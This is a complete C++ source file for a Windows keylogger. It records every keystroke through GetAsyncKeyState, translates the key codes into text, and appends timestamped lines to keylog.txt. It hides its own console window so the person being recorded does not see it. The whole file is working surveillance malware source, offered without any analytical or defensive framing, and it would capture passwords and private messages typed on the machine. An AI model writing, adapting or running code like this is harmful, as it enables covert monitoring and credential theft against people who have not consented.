#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
using namespace std;

string get_timestamp()
{
    time_t now = time(0);
    tm *ltm = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", ltm);
    return string(timestamp);
}

void log_key(int key, string &buffer)
{
    if (key >= 48 && key <= 57)
    {
        buffer += (char)key;
    }
    else if (key >= 65 && key <= 90)
    {
        if (GetKeyState(VK_SHIFT) & 0x8000)
        {
            buffer += (char)key;
        }
        else
        {
            buffer += (char)(key + 32);
        }
    }
    else
    { 
        switch (key)
        {
        case VK_SPACE:
            buffer += " ";
            break;
        case VK_TAB:
            buffer += "\t";
            break;
        case VK_BACK:
            buffer += "[BACKSPACE]";
            break;
        case VK_ESCAPE:
            buffer += "[ESC]";
            break;
        case VK_DELETE:
            buffer += "[DELETE]";
            break;
        case VK_LEFT:
            buffer += "[LEFT]";
            break;
        case VK_RIGHT:
            buffer += "[RIGHT]";
            break;
        case VK_UP:
            buffer += "[UP]";
            break;
        case VK_DOWN:
            buffer += "[DOWN]";
            break;
        case VK_HOME:
            buffer += "[HOME]";
            break;
        case VK_END:
            buffer += "[END]";
            break;
        case VK_PRIOR:
            buffer += "[PAGEUP]";
            break;
        case VK_NEXT:
            buffer += "[PAGEDOWN]";
            break;
        case VK_INSERT:
            buffer += "[INSERT]";
            break;
        case VK_RETURN:
            buffer += "[ENTER]";
            break;
        case VK_SHIFT:
            buffer += "[SHIFT]";
            break;
        case VK_CONTROL:
            buffer += "[CTRL]";
            break;
        case VK_LCONTROL:
            buffer += "[LCTRL]";
            break;
        case VK_RCONTROL:
            buffer += "[RCTRL]";
            break;
        case VK_MENU:
            buffer += "[ALT]";
            break;
        case VK_LMENU:
            buffer += "[LALT]";
            break;
        case VK_RMENU:
            buffer += "[RALT]";
            break;
        case VK_LSHIFT:
            buffer += "[LSHIFT]";
            break;
        case VK_RSHIFT:
            buffer += "[RSHIFT]";
            break;
        case VK_CAPITAL:
            buffer += "[CAPSLOCK]";
            break;
        case VK_NUMPAD0:
            buffer += "0";
            break;
        case VK_NUMPAD1:
            buffer += "1";
            break;
        case VK_NUMPAD2:
            buffer += "2";
            break;
        case VK_NUMPAD3:
            buffer += "3";
            break;
        case VK_NUMPAD4:
            buffer += "4";
            break;
        case VK_NUMPAD5:
            buffer += "5";
            break;
        case VK_NUMPAD6:
            buffer += "6";
            break;
        case VK_NUMPAD7:
            buffer += "7";
            break;
        case VK_NUMPAD8:
            buffer += "8";
            break;
        case VK_NUMPAD9:
            buffer += "9";
            break;
        case VK_OEM_PLUS:
            buffer += "+";
            break;
        case VK_OEM_MINUS:
            buffer += "-";
            break;
        case VK_OEM_COMMA:
            buffer += ",";
            break;
        case VK_OEM_PERIOD:
            buffer += ".";
            break;
        case VK_OEM_1:
            buffer += ";";
            break;
        case VK_OEM_2:
            buffer += "/";
            break;
        case VK_OEM_3:
            buffer += "`";
            break;
        case VK_OEM_4:
            buffer += "[";
            break;
        case VK_OEM_5:
            buffer += "\\";
            break;
        case VK_OEM_6:
            buffer += "]";
            break;
        case VK_OEM_7:
            buffer += "'";
            break;
        case VK_F1:
            buffer += "[F1]";
            break;
        case VK_F2:
            buffer += "[F2]";
            break;
        case VK_F3:
            buffer += "[F3]";
            break;
        case VK_F4:
            buffer += "[F4]";
            break;
        case VK_F5:
            buffer += "[F5]";
            break;
        case VK_F6:
            buffer += "[F6]";
            break;
        case VK_F7:
            buffer += "[F7]";
            break;
        case VK_F8:
            buffer += "[F8]";
            break;
        case VK_F9:
            buffer += "[F9]";
            break;
        case VK_F10:
            buffer += "[F10]";
            break;
        case VK_F11:
            buffer += "[F11]";
            break;
        case VK_F12:
            buffer += "[F12]";
            break;
        // This not seriously needed, but still added anyway :D
        case VK_NUMLOCK:
            buffer += "[NUMLOCK]";
            break;
        case VK_SCROLL:
            buffer += "[SCROLLLOCK]";
            break;
        case VK_PAUSE:
            buffer += "[PAUSE]";
            break;
        case VK_SNAPSHOT:
            buffer += "[PRINTSCREEN]";
            break;
        case VK_LWIN:
            buffer += "[LWIN]";
            break;
        case VK_RWIN:
            buffer += "[RWIN]";
            break;
        case VK_APPS:
            buffer += "[MENU]";
            break;
        case VK_SLEEP:
            buffer += "[SLEEP]";
            break;
        case VK_MULTIPLY:
            buffer += "*";
            break;
        case VK_ADD:
            buffer += "+";
            break;
        case VK_SEPARATOR:
            buffer += "|";
            break;
        case VK_SUBTRACT:
            buffer += "-";
            break;
        case VK_DECIMAL:
            buffer += ".";
            break;
        case VK_DIVIDE:
            buffer += "/";
            break;
        case VK_CLEAR:
            buffer += "[CLEAR]";
            break;
        case VK_SELECT:
            buffer += "[SELECT]";
            break;
        case VK_PRINT:
            buffer += "[PRINT]";
            break;
        case VK_EXECUTE:
            buffer += "[EXECUTE]";
            break;
        case VK_HELP:
            buffer += "[HELP]";
            break;
        case VK_CANCEL:
            buffer += "[CANCEL]";
            break;
        case VK_MODECHANGE:
            buffer += "[MODECHANGE]";
            break;
        case VK_BROWSER_BACK:
            buffer += "[BROWSER_BACK]";
            break;
        case VK_BROWSER_FORWARD:
            buffer += "[BROWSER_FORWARD]";
            break;
        case VK_BROWSER_REFRESH:
            buffer += "[BROWSER_REFRESH]";
            break;
        case VK_BROWSER_STOP:
            buffer += "[BROWSER_STOP]";
            break;
        case VK_BROWSER_SEARCH:
            buffer += "[BROWSER_SEARCH]";
            break;
        case VK_BROWSER_FAVORITES:
            buffer += "[BROWSER_FAVORITES]";
            break;
        case VK_BROWSER_HOME:
            buffer += "[BROWSER_HOME]";
            break;
        case VK_VOLUME_MUTE:
            buffer += "[VOLUME_MUTE]";
            break;
        case VK_VOLUME_DOWN:
            buffer += "[VOLUME_DOWN]";
            break;
        case VK_VOLUME_UP:
            buffer += "[VOLUME_UP]";
            break;
        case VK_MEDIA_NEXT_TRACK:
            buffer += "[MEDIA_NEXT]";
            break;
        case VK_MEDIA_PREV_TRACK:
            buffer += "[MEDIA_PREV]";
            break;
        case VK_MEDIA_STOP:
            buffer += "[MEDIA_STOP]";
            break;
        case VK_MEDIA_PLAY_PAUSE:
            buffer += "[MEDIA_PLAY_PAUSE]";
            break;
        case VK_LAUNCH_MAIL:
            buffer += "[LAUNCH_MAIL]";
            break;
        case VK_LAUNCH_MEDIA_SELECT:
            buffer += "[LAUNCH_MEDIA]";
            break;
        case VK_LAUNCH_APP1:
            buffer += "[LAUNCH_APP1]";
            break;
        case VK_LAUNCH_APP2:
            buffer += "[LAUNCH_APP2]";
            break;
        default:
            buffer += "[UNKNOWN:" + to_string(key) + "]";
            break;
        }
    }
}

void write_buffer(const string &buffer, ofstream &outfile)
{
    if (!buffer.empty())
    {
        outfile << get_timestamp() << ": " << buffer << endl;
        outfile.flush(); // Ensure immediate write to file
    }
}

int main()
{
    ofstream outfile("keylog.txt", ios::app);
    if (!outfile.is_open())
    {
        return 1;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    string buffer;
    while (true)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) & 0x0001)
            {
                if (key == VK_RETURN)
                {
                    write_buffer(buffer, outfile);
                    buffer.clear();
                }
                else
                {
                    log_key(key, buffer);
                }
            }
        }
        Sleep(10);
    }

    outfile.close();
    return 0;
}
